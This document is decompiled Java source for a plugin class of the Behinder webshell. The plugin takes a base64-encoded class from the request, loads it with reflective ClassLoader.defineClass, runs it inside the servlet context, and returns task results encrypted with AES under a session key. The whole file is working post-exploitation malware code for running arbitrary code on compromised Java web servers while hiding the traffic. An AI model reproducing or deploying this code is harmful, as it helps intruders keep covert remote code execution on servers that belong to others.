package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;

public class Plugin {
   public static String taskID;
   public static String action;
   public static String payload;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();

      try {
         this.fillContext(obj);
      } catch (Exception var44) {
         result.put("msg", var44.getMessage());
         result.put("status", "fail");
         return true;
      }

      if (action.equals("submit")) {
         ClassLoader classLoader = this.getClass().getClassLoader();
         Class urlClass = ClassLoader.class;
         boolean var37 = false;

         ServletOutputStream so = null;
         label230: {
            try {
               var37 = true;
               Method method = urlClass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
               method.setAccessible(true);
               byte[] payloadData = this.base64decode(payload);
               Class payloadCls = (Class)method.invoke(classLoader, payloadData, 0, payloadData.length);
               Object payloadObj = payloadCls.newInstance();
               Method payloadMethod = payloadCls.getDeclaredMethod("execute", ServletRequest.class, ServletResponse.class, HttpSession.class);
               payloadMethod.invoke(payloadObj, this.Request, this.Response, this.Session);
               result.put("msg", "任务提交成功");
               result.put("status", "success");
               var37 = false;
               break label230;
            } catch (Exception var45) {
               result.put("msg", var45.getMessage());
               result.put("status", "fail");
               var37 = false;
            } finally {
               if (var37) {
                  try {
                     so = this.Response.getOutputStream();
                     so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                     so.flush();
                     so.close();
                  } catch (Exception var39) {
                  }

               }
            }

            try {
               so = this.Response.getOutputStream();
               so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
               so.flush();
               so.close();
            } catch (Exception var42) {
            }

            return true;
         }

         try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
         } catch (Exception var43) {
         }
      } else if (action.equals("getResult")) {
         boolean var25 = false;

         ServletOutputStream so = null;
         label231: {
            try {
               var25 = true;
               Map taskResult = (Map)this.Session.getAttribute(taskID);
               Map temp = new HashMap();
               temp.put("running", taskResult.get("running"));
               temp.put("result", this.base64encode((String)taskResult.get("result")));
               result.put("msg", this.buildJson(temp, false));
               result.put("status", "success");
               var25 = false;
               break label231;
            } catch (Exception var47) {
               result.put("msg", var47.getMessage());
               result.put("status", "fail");
               var25 = false;
            } finally {
               if (var25) {
                  try {
                     so = this.Response.getOutputStream();
                     so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                     so.flush();
                     so.close();
                  } catch (Exception var38) {
                  }

               }
            }

            try {
               so = this.Response.getOutputStream();
               so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
               so.flush();
               so.close();
            } catch (Exception var40) {
            }

            return true;
         }

         try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
         } catch (Exception var41) {
         }
      }

      return true;
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private String base64encode(String clearText) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }
}
